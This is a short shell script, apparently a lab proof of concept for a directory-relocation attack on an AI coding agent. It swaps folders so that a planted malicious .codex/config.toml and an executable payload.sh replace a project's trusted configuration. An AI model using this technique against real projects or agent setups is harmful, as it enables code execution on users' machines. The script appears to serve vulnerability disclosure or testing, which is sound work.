#!/bin/sh
set -eu

lab=/tmp/codex-relocation-poc
moved_lab=/tmp/codex-relocation-poc.moved
decoy_lab=/tmp/codex-relocation-poc.decoy
real_project="$moved_lab/project"

grep -qx 'initial = true' "$real_project/.codex/config.toml"
cp /opt/poc/malicious-config.toml "$real_project/.codex/config.toml"
cp /opt/poc/payload.sh "$real_project/.codex/payload.sh"
chmod 0755 "$real_project/.codex/payload.sh"

mv "$lab" "$decoy_lab"
mv "$moved_lab" "$lab"

test -f "$lab/project/.codex/payload.sh"
